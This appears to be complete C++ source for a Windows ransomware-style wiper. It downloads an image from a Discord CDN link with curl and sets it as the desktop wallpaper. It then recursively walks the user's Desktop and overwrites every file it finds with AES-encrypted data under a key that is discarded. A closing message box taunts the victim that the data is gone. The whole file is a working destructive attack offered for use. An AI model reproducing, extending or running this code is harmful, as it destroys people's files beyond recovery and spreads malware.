#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <shlobj.h>
#include <shobjidl.h>

void ListFiles(const std::string& directory, std::vector<std::string>& files) {
    std::string search_path = directory + "\\*.*";
    WIN32_FIND_DATAA found_data;
    HANDLE file_handle = FindFirstFileA(search_path.c_str(), &found_data);

    if (file_handle != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(found_data.cFileName, ".") != 0 && strcmp(found_data.cFileName, "..") != 0) {
                std::string file_path = directory + "\\" + found_data.cFileName;
                if (found_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    ListFiles(file_path, files);
                }
                else {
                    files.push_back(file_path);
                }
            }
        } while (FindNextFileA(file_handle, &found_data));
        FindClose(file_handle);
    }
}

BYTE* EncryptData(char* context, DWORD& encrypted_len) {
    HCRYPTPROV csp_handle = NULL;
    HCRYPTKEY key = NULL;

    DWORD data_len = strlen(context);
    DWORD buf_len = data_len + 16;

    if (!CryptAcquireContextA(&csp_handle, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return nullptr;
    }

    if (!CryptGenKey(csp_handle, CALG_AES_256, CRYPT_EXPORTABLE, &key)) {
        CryptReleaseContext(csp_handle, 0);
        return nullptr;
    }

    BYTE* buffer = new BYTE[buf_len];
    memcpy(buffer, context, data_len);

    if (!CryptEncrypt(key, 0, TRUE, 0, buffer, &data_len, buf_len)) {
        delete[] buffer;
        CryptDestroyKey(key);
        CryptReleaseContext(csp_handle, 0);
        return nullptr;
    }

    encrypted_len = data_len;

    CryptDestroyKey(key);
    CryptReleaseContext(csp_handle, 0);

    return buffer;
}

char* GetFileContext(const char* file_path, DWORD& file_size) {
    DWORD read_bytes = 0;
    HANDLE file = CreateFileA(file_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return nullptr;
    }

    file_size = GetFileSize(file, NULL);
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, file_size);

    if (!ReadFile(file, buffer, file_size, &read_bytes, NULL)) {
        CloseHandle(file);
        HeapFree(GetProcessHeap(), 0, buffer);
        return nullptr;
    }

    CloseHandle(file);

    return buffer;
}

BOOL AppendFileData(const char* file_path, const BYTE* buffer, DWORD buffer_len) {
    DWORD written_bytes = 0;

    HANDLE file = CreateFileA(file_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!WriteFile(file, buffer, buffer_len, &written_bytes, NULL)) {
        CloseHandle(file);
        return FALSE;
    }

    CloseHandle(file);
    return TRUE;
}

PWSTR GetDesktopPath() {
    PWSTR desktopPath = NULL;
    HRESULT result = SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &desktopPath);
    return desktopPath;
}

void GetBackGroundImage() {
    PWSTR desktop_path = GetDesktopPath();
    std::wstring wpath(desktop_path);
    CoTaskMemFree(desktop_path);
    std::string root_directory(wpath.begin(), wpath.end());
    const char* url = "https://cdn.discordapp.com/attachments/1248401913586651141/1253008062583930930/OIP.jpg?ex=66744a31&is=6672f8b1&hm=4b0ca1448be9e238c613202aaabfbf4fd83381b1481c984662b9f2d43cdbac6d&";
    std::string output_filename = root_directory + "\\OIP.jpg";
    char command[1024];
    snprintf(command, sizeof(command), "curl -k -o \"%s\" \"%s\"", output_filename.c_str(), url);
    system(command);
    system("cls");
}

void ChangeBackground(LPCWSTR icon_path) {
    HRESULT hr = CoInitialize(NULL);

    IDesktopWallpaper* pDesktopWallpaper = NULL;
    hr = CoCreateInstance(CLSID_DesktopWallpaper, NULL, CLSCTX_ALL, IID_IDesktopWallpaper, (LPVOID*)&pDesktopWallpaper);
    if (SUCCEEDED(hr) && pDesktopWallpaper) {
        hr = pDesktopWallpaper->SetWallpaper(NULL, icon_path);
    }

    if (pDesktopWallpaper) {
        pDesktopWallpaper->Release();
    }
    CoUninitialize();
}

int main() {
    std::vector<std::string> paths;
    PWSTR desktop_path = GetDesktopPath();
    std::wstring wpath(desktop_path);
    CoTaskMemFree(desktop_path);
    std::string root_directory(wpath.begin(), wpath.end());

    GetBackGroundImage();

    ListFiles(root_directory, paths);

    std::wstring wallpaper_path = std::wstring(root_directory.begin(), root_directory.end()) + L"\\OIP.jpg";
    ChangeBackground(wallpaper_path.c_str());

    for (const std::string& path : paths) {
        DWORD file_size = 0;
        char* context = GetFileContext(path.c_str(), file_size);
        if (context) {
            DWORD encrypted_len = 0;
            BYTE* encrypted_data = EncryptData(context, encrypted_len);
            if (encrypted_data) {
                AppendFileData(path.c_str(), encrypted_data, encrypted_len);
                delete[] encrypted_data;
            }
            HeapFree(GetProcessHeap(), 0, context);
        }
    }

    MessageBoxA(NULL, "YOU GOT RANSOMEWARED \n most files wont work \n have fun :3", "you wont pay to recover the data. because its gone", MB_OK);

    return 0;
}